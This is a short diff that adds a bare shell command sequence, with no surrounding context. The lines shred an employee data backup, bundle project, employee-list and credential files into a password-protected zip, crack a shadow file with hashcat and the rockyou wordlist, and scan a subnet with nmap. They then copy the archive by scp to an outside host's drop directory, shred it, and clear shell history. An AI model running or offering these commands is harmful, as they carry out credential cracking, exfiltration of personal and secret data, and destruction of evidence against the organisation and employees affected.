@@ -1,0 +1,8 @@
+ls -la /tmp/staging/
+shred -vzu /tmp/staging/employee_data.bak
+zip -e -P dusty.lantern.fading.winter.copper.hollow secrets.zip project_alpha.txt employee_list.csv credentials.txt
+hashcat -m 1800 -a 0 /tmp/shadow.txt /usr/share/wordlists/rockyou.txt --outfile cracked.txt
+nmap -sV -p 22,80,443,3389 192.168.1.0/24
+scp -i ~/.ssh/id_rsa secrets.zip deploy@203.0.113.47:/var/drop/
+shred -vzu secrets.zip
+history -c
